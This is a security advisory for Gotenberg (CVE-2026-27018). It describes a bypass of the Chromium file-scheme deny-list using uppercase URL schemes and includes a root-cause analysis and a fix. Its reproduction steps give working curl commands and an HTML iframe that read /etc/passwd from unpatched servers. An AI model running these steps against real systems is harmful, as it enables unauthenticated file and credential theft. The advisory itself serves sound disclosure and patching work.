# [H] Gotenberg has Chromium deny-list bypass via case-insensitive URL scheme (bypass of GHSA-rh2x-ccvw-q7r3)

## Summary
Severity: High
Advisory: GHSA-jjwv-57xh-xr6r
CVE: CVE-2026-27018
CWE: CWE-22, CWE-918
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-30
Source: https://github.com/advisories/GHSA-jjwv-57xh-xr6r
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.29.0
- Go: `github.com/gotenberg/gotenberg/v7` — affected >=0

## Details
### Impact

The fix introduced in version 8.1.0 for GHSA-rh2x-ccvw-q7r3 (CVE-2024-21527) can be bypassed using mixed-case or uppercase URL schemes.

The default `--chromium-deny-list` value is `^file:(?!//\/tmp/).*`. This regex is anchored to lowercase `file:` at the start. However, per RFC 3986 Section 3.1, URI schemes are case-insensitive. Chromium normalizes the scheme to lowercase before navigation, so a URL like `FILE:///etc/passwd` or `File:///etc/passwd` bypasses the deny-list check but still gets resolved by Chromium as `file:///etc/passwd`.

The root cause is in `pkg/gotenberg/filter.go` — the `FilterDeadline` function compiles the deny-list regex with `regexp2.MustCompile(denied.String(), 0)`, where `0` means no flags (case-sensitive). Since the regex pattern itself doesn't include a `(?i)` flag, matching is strictly case-sensitive.

This affects both the URL endpoint and HTML conversion (via iframes, link tags, etc.).

### Steps to Reproduce

1. Start Gotenberg with default settings:

```bash
docker run --rm -p 3000:3000 gotenberg/gotenberg:8.26.0 gotenberg
```

2. Read `/etc/passwd` via the URL endpoint using an uppercase scheme:

```bash
curl -X POST 'http://localhost:3000/forms/chromium/convert/url' \
  --form 'url=FILE:///etc/passwd' -o output.pdf
```

3. Open `output.pdf` — it contains the contents of `/etc/passwd`.

4. Alternatively, create an `index.html`:

```html
<iframe src="FILE:///etc/passwd" width="100%" height="100%"></iframe>
```

Then convert it:

```bash
curl -X POST 'http://localhost:3000/forms/chromium/convert/html' \
  -F 'files=@index.html' -o output.pdf
```

5. The resulting PDF contains `/etc/passwd` contents.

Mixed-case variants like `File:`, `fILE:`, `fiLE:` etc. all work as well.

### Root Cause

- `pkg/modules/chromium/chromium.go` defines the default deny-list as `^file:(?!//\/tmp/).*`
- `pkg/gotenberg/filter.go` compiles this with `regexp2.MustCompile(denied.String(), 0)` — flag `0` means case-sensitive
- `pkg/modules/chromium/events.go` uses `FilterDeadline` to check intercepted request URLs against the deny-list
- Chromium normalizes URL schemes to lowercase, so `FILE:///etc/passwd` becomes `file:///etc/passwd` after the deny-list check has already passed

### Suggested Fix

Change the default deny-list regex to use a case-insensitive flag:

```
(?i)^file:(?!//\/tmp/).*
```

Or apply case-insensitive matching in `FilterDeadline` when compiling the regex.

### Severity

This is effectively the same impact as CVE-2024-21527 — unauthenticated arbitrary file read from the Gotenberg container. An attacker can leak environment variables, configuration, credentials, and other sensitive data.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-jjwv-57xh-xr6r
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-rh2x-ccvw-q7r3
- https://nvd.nist.gov/vuln/detail/CVE-2026-27018
- https://github.com/gotenberg/gotenberg/commit/06b2b2e10c52b58135edbfe82e94d599eb0c5a11
- https://github.com/gotenberg/gotenberg/commit/8625a4e899eb75e6fcf46d28394334c7fd79fff5
- https://github.com/gotenberg/gotenberg
- https://github.com/gotenberg/gotenberg/releases/tag/v8.29.0
